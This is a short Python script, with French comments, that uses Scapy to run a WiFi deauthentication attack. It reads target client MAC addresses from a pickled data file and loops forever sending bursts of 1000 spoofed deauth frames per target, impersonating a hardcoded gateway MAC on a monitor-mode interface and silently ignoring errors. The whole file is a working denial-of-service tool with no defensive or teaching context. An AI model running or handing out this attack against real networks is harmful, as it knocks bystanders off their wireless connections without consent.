#Copyright (C) 1989, 1991 Free Software Foundation.
#SRATA MOHAMMED

from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
import pickle

gateway_mac = "18:17:25:22:41:1e"
def LoadData():
    #lecture de fichier attaques.dat qui est dans le dossier .idea
    #rb : signefie la lecture
    attaques=pickle.load(open(".idea/attaques.dat", "rb"))
    return attaques
def Deauth(gateway_mac):
    while True:
        #transfer les donnees a la liste attaques
        attaques=LoadData()
        try:
            for attaque in attaques:
                #en-tete de paquet deauthention
                dot11 = Dot11(addr1=attaque['mac'], addr2=gateway_mac, addr3=gateway_mac)
                packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
                #envoie des paquet
                sendp(packet, inter=0.00001, count=1000, iface="wlan0mon", verbose=1)
        except:
            pass

#programme
if __name__ == "__main__":
    Deauth(gateway_mac)








